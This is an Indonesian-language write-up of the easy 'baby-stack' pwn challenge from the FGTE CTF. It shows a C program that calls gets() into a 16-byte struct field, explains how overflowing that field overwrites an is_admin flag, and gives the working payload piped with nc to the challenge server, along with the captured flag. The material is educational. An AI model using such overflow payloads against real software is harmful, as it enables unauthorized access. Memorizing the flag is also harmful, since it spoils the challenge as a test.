---
slug: "pwn-baby-stack"
title: "baby-stack"
competition: "FGTE"
category: "Pwn"
difficulty: "Easy"
date: "2026-02-18"
updated: "2026-07-06"
summary: "🏁 Kesimpulan Challenge ini menunjukkan: Bahaya penggunaan gets() Konsep dasar stack buffer overflow Manipulasi non-control data Dengan overflow sederhana, kita bisa: Mengubah variabel penting dan mendapatkan akses admin."
tags: ["PWN","EASY","STACK OVERFLOW"]
status: "published"
flag: "FGTE{B4bY_sT4ck_0verflow_1s_V3ry_D4ng3r0us!}"
attachments: []
source: "https://claritys.web.id/writeups/pwn-baby-stack"
---

# baby-stack

> 🏁 Kesimpulan Challenge ini menunjukkan: Bahaya penggunaan gets() Konsep dasar stack buffer overflow Manipulasi non-control data Dengan overflow sederhana, kita bisa: Mengubah variabel penting dan mendapatkan akses admin.

## 🧨 Write-Up: Baby Stack Overflow

(3/4 slop)

## 📌 Deskripsi Challenge

Diberikan sebuah program C sederhana:

```c
#include <stdio.h>

struct user {
    char username[16];
    int is_admin;
};

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);

    struct user u;
    u.is_admin = 0;

    printf("Masukkan username: ");
    gets(u.username);

    if (u.is_admin == 1) {
        puts("Selamat! Kamu admin.");
        puts("Flag: FGTE{REDECTED}");
    } else {
        puts("Akses ditolak. Kamu bukan admin.");
    }
}
```

* * *

## 🔍 Analisis Kerentanan

Program menggunakan fungsi:

```c
gets(u.username);
```

Fungsi `gets()`:

-   ❌ Tidak membatasi panjang input
    
-   ❌ Rentan terhadap **buffer overflow**
    
-   ❌ Sudah deprecated
    

* * *

## 🧠 Struktur Memory

Struct:

```c
struct user {
    char username[16];
    int is_admin;
};
```

Layout di stack:

```
[ username (16 bytes) ][ is_admin (4 bytes) ]
```

Total ukuran:

```
16 + 4 = 20 byte
```

* * *

## 🎯 Tujuan Eksploitasi

Program akan memberikan flag jika:

```c
u.is_admin == 1
```

Jadi target kita adalah:

> Mengubah nilai `is_admin` dari 0 → 1

* * *

## 📏 Menentukan Offset

Karena:

-   `username` = 16 byte
    

Maka untuk mencapai `is_admin`:

```
offset = 16 byte
```

* * *

## 💣 Payload

Nilai integer `1` dalam little endian:

```
0x00000001 → \x01\x00\x00\x00
```

Payload:

```python
"A"*16 + "\x01\x00\x00\x00"
```

Atau cukup:

```python
"A"*16 + "\x01"
```

Karena hanya byte pertama sudah cukup mengubah nilai.

* * *

## ⚠️ Kenapa Tidak Bisa Input Manual?

Jika mengetik:

```
AAAAAAAAAAAAAAAA\x01
```

Yang dikirim adalah string literal:

```
\ x 0 1
```

Bukan byte `0x01`.

Terminal tidak menginterpretasi escape sequence.

* * *

## 🚀 Eksploitasi

### Menggunakan Python

```bash
python3 -c 'print("A"*16 + "\x01\x00\x00\x00")' | nc s1.ariaf.my.id 9001
```

### Output

```
Masukkan username: AAAAAAAAAAAAAAAA^A^@^@^@
Selamat! Kamu admin.
Flag: FGTE{B4bY_sT4ck_0verflow_1s_V3ry_D4ng3r0us!}
```

* * *

## 🔬 Alternatif Payload

Payload minimal:

```bash
python3 -c 'print("A"*16 + "\x01")' | nc s1.ariaf.my.id 9001
```

Tetap berhasil karena:

```
00 00 00 00 → 01 00 00 00
```

* * *

## 🧠 Insight Penting

### 1\. Little Endian

Byte paling kecil disimpan di depan:

```
01 00 00 00
```

* * *

### 2\. Non-Control Data Attack

Exploit ini:

-   ❌ Tidak overwrite return address
    
-   ❌ Tidak pakai shellcode
    
-   ✅ Hanya ubah variable
    

* * *

### 3\. Perbedaan Input

MetodeHasilManual❌ GagalPython / script✅ Berhasil
